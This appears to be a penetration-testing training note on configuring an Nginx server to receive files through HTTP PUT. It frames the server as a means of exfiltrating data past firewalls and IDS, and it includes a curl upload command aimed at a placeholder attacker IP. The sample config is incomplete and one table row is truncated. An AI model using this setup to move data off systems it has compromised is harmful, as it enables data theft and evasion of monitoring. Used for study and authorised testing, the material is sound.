### **Catching Files over HTTP/S with Nginx**

Using **HTTP/HTTPS** for file transfers is advantageous because these protocols are generally permitted through firewalls. This method also provides the benefit of **encryption in transit**, preventing network IDS from flagging sensitive data sent in plaintext. **Nginx** is often a better alternative to Apache for this task due to its simpler configuration and lower risk of security issues, such as the accidental execution of uploaded web shells.

---

#### **Operational Workflow: Setting Up a Secure Nginx Upload Server**

This methodology focuses on enabling **HTTP PUT** requests to exfiltrate files to an attack-controlled Nginx server.

1. **Create an Upload Directory**: Establish a dedicated location on the filesystem to store incoming files.
2. **Modify Permissions**: Change the directory owner to the web server user to ensure the service can write to it.
3. **Configure Nginx**: Define a new server block that listens on a specific port.
4. **Enable Configuration**: Create a symbolic link from the available sites to the enabled sites directory.
5. **Service Restart**: Restart Nginx to apply the new configuration and troubleshoot any binding errors.

---

#### **Command Reference**

|Action|Command|Purpose|
|:--|:--|:--|
|**Directory Creation**|`sudo mkdir -p <UPLOAD_PATH>`|Creates the target directory for exfiltrated files.|
|**Set Ownership**|`sudo chown -R www-data:www-data <UPLOAD_PATH>`|Grants Nginx permission to write files to the directory.|
|**Enable Site**|`sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`|Activates the specific upload configuration.|
|**Restart Service**|`sudo systemctl restart nginx.service`|Loads the new configuration into the active service.|
|**Check Port Usage**|`ss -lnpt \|grep `|
|**Test Upload**|`curl -T <FILE_PATH> http://<ATTACK_IP>:<PORT>/<UPLOAD_DIR>/<DEST_NAME>`|Uses a PUT request to transfer a file to the server.|

---

#### **Configuration: `/etc/nginx/sites-available/upload.conf`**

The following minimal configuration allows Nginx to listen for incoming connections on a designated port.

```
server {
    listen <PORT>;
}
```

---

#### **Troubleshooting & Edge Cases**

- **Port Binding Failures**: If the service fails to start, check `/var/log/nginx/error.log`. In environments like Pwnbox, port 80 is frequently occupied by existing processes (e.g., Python modules).
- **Default Conflict**: To resolve binding issues on port 80, the default Nginx configuration file may need to be removed.
    - **Action**: `sudo rm /etc/nginx/sites-enabled/default`.
- **Process Identification**: Use `ps -ef \| grep <PID>` to identify which service is blocking a required port.

---

#### **Attack Implications & Decision Logic**

- **Exfiltration Security**: Nginx is preferable for exfiltration because **directory listing is disabled by default**. This conceals sensitive files from unauthorized discovery, whereas Apache often lists directory contents if an index file is missing.
- **Bypassing Firewalls**: If inbound connections to a pivot are restricted, HTTP/S is the most likely protocol to be permitted for outbound exfiltration.
- **Verification**: After a transfer, use `tail -1 <UPLOAD_PATH>/<FILE>` on the server to verify the integrity of the received data.

---

#### **Dangerous or Misconfigured Settings**

|Setting/Module|Risk|Implication|
|:--|:--|:--|
|**Apache PHP Module**|High|Automatically executes any file ending in `.php`, making web shell uploads trivial.|
|**Directory Listing**|Medium|If enabled (default in Apache), it exposes all sensitive exfiltrated files to anyone browsing the directory.|
|**Plaintext Transfers**|Medium|Using protocols without encryption allows IDS to capture sensitive data, such as passwords, in transit.|